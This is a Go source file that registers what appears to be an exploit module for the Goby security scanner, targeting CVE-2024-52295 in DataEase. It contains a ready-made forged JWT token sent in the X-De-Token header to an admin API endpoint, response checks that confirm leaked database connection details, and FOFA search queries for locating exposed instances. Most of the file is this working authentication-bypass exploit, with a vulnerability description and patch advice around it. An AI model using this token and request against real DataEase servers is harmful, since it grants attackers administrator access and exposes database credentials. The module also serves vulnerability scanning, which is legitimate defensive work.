package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "DataEase JWT Hardcoded Authentication Bypass Vulnerability（CVE-2024-52295）",
    "Description": "<p>DataEase is an open-source data visualization analysis tool developed by Hangzhou Feizhi Cloud Information Technology Co., Ltd. This vulnerability exists in the JWT authentication mechanism of DataEase. Due to the use of hardcoded keys, attackers can forge legitimate JWT Tokens to bypass authentication and take over the system backend. Combined with backend deserialization vulnerabilities and other functions, attackers can further achieve remote code execution (RCE) and gain server privileges.</p>",
    "Product": "DataEase",
    "Homepage": "https://www.fit2cloud.com/dataease/index.html",
    "DisclosureDate": "2024-01-05",
    "PostTime": "2025-01-07",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"Dataease\" && body=\"/dataease.svg\"",
    "GobyQuery": "body=\"Dataease\" && body=\"/dataease.svg\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to bypass authentication, take over the system backend, and further utilize backend functions to achieve remote code execution (RCE), potentially leading to sensitive data leakage, complete system control, and business interruption.</p>",
    "Recommendation": "<p>It is recommended to close exposed internet interfaces or set strict access permissions, and upgrade to the latest secure version to fix this vulnerability. Also, avoid using hardcoded keys in the code and adopt secure key management mechanisms.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144945559?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "define",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/de2api/engine/getEngine",
                "follow_redirect": true,
                "header": {
                    "X-De-Token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjo5OTk5OTk5OTk5OX0.okytUClKBAHbww_C3ZZTINTUtbQSSE9ILJwhbIBr_cY",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "jdbc:mysql://",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "username",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/de2api/engine/getEngine",
                "follow_redirect": true,
                "header": {
                    "X-De-Token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjo5OTk5OTk5OTk5OX0.okytUClKBAHbww_C3ZZTINTUtbQSSE9ILJwhbIBr_cY",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "jdbc:mysql://",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|variable|Please bring the request header for access:{{{CRLF}}}X-De-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjo5OTk5OTk5OTk5OX0.okytUClKBAHbww_C3"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2024-52295"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.9",
    "Translation": {
        "CN": {
            "Name": "飞致云DataEase JWT硬编码 身份认证绕过漏洞（CVE-2024-52295）",
            "Product": "飞致云 Database",
            "Description": "<p>DataEase 是杭州飞致云信息科技有限公司推出的一款开源数据可视化分析工具，旨在帮助用户快速分析数据并洞察业务趋势，以实现业务的改进与优化。DataEase 存在 JWT 硬编码身份认证绕过漏洞，由于硬编码密钥的使用，攻击者可以伪造合法的 JWT Token，从而绕过身份认证，接管系统后台。结合后台的反序列化漏洞和其他功能，攻击者可以进一步实现远程代码执行（RCE），获取服务器权限。</p>",
            "Recommendation": "<p>建议关闭互联网暴露的接口或设置严格的访问权限，并升级至最新安全版本以修复该漏洞。同时，避免在代码中使用硬编码密钥，改用安全的密钥管理机制。</p>",
            "Impact": "<p>该漏洞允许攻击者绕过身份认证，接管系统后台，进一步利用后台功能实现远程代码执行（RCE），可能导致敏感数据泄露、系统被完全控制以及业务中断等严重后果。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "DataEase JWT Hardcoded Authentication Bypass Vulnerability（CVE-2024-52295）",
            "Product": "DataEase",
            "Description": "<p>DataEase is an open-source data visualization analysis tool developed by Hangzhou Feizhi Cloud Information Technology Co., Ltd. This vulnerability exists in the JWT authentication mechanism of DataEase. Due to the use of hardcoded keys, attackers can forge legitimate JWT Tokens to bypass authentication and take over the system backend. Combined with backend deserialization vulnerabilities and other functions, attackers can further achieve remote code execution (RCE) and gain server privileges.</p>",
            "Recommendation": "<p>It is recommended to close exposed internet interfaces or set strict access permissions, and upgrade to the latest secure version to fix this vulnerability. Also, avoid using hardcoded keys in the code and adopt secure key management mechanisms.</p>",
            "Impact": "<p>This vulnerability allows attackers to bypass authentication, take over the system backend, and further utilize backend functions to achieve remote code execution (RCE), potentially leading to sensitive data leakage, complete system control, and business interruption.</p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "vulurl": "define|variable|{{{fixedhostinfo}}}//de2api/engine/getEngine"
    },
    "VariablesOrder": [
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9982"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}